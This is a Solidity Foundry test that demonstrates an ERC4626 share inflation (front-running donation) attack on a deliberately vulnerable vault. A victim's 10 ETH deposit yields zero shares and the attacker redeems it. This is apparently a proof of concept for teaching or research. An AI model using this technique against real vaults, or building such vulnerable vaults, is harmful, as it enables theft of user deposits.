// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
// Version 4.8 of ERC4626 is vulnerable to inflation attack
import {ERC4626} from "openzeppelin-contracts/contracts/token/ERC20/extensions/ERC4626.sol";

contract VulnerableVault is ERC4626 {
    constructor(ERC20 _asset) ERC4626(_asset) ERC20("VulnVault", "VulnVault") {}
}

contract Attack is Test {
    ERC20 public weth;
    ERC4626 public vault;
    address public innocent;

    function setUp() public {
        weth = new ERC20("WETH", "Wrapped ETH");
        vault = new VulnerableVault(weth);
        innocent = address(0x123);

        // Give everyone some fake weth tokens
        deal(address(weth), address(this), 100 ether);
        deal(address(weth), innocent, 100 ether);

        // Approvals
        weth.approve(address(vault), type(uint256).max);
        vm.prank(innocent);
        weth.approve(address(vault), type(uint256).max);
    }

    function testFrontrun() public {
        emit log_named_decimal_uint("weth balance of attacker before", weth.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("weth balance of innocent before", weth.balanceOf(innocent), 18);
        // We deposit 1 wei into the vault to take 100% ownership
        uint256 ourShares = vault.deposit(1, address(this));
        // Now donate a large amount into the vault to shift the price curve
        weth.transfer(address(vault), 10 ether);

        // Innocent deposits 10 eth into the vault
        vm.prank(innocent);
        uint256 innocentShares = vault.deposit(10 ether, innocent);
        // Innocent should receive 0 shares
        assertEq(innocentShares, 0);
        emit log_named_uint("number of shares received by innocent", innocentShares);

        // Withdraw our shares
        vault.redeem(ourShares, address(this), address(this));
        // Check our balance
        assertEq(weth.balanceOf(address(this)), 110 ether);
        emit log_named_decimal_uint("weth balance of attacker after", weth.balanceOf(address(this)), 18);
    }
}
